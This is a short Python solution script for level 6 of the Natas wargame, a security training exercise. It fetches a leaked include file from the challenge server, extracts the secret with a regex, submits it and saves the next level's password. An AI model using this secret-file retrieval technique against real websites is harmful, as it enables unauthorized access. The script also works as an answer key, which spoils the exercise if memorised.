import re
import requests
from natas_utils import *

LEVEL = 6
URL, LOGIN = load_level(LEVEL)

if __name__ == "__main__":
    # main challenge page has a link to view source code at /index-source.html
    #
    # server will check a secret sent in a POST request against the server's secret,
    # and return the flag if the check succeeds
    #
    # source code leaks the include path for the secret, and that file is accessible!
    response = requests.get(URL + "/includes/secret.inc", auth=LOGIN)

    match = re.search(r'secret = "([A-Z]+)"', response.text)
    secret = match.group(1)

    # submit the form
    response = requests.post(URL, auth=LOGIN, data={"secret": secret, "submit": ""})

    # get the flag
    natas7_password = try_level_login(7, extract_candidate_passwords(response.text))

    if natas7_password:
        print("natas7:", natas7_password)
        store_level_password(LEVEL + 1, natas7_password)
    else:
        exit("Failed to get password for the next level.")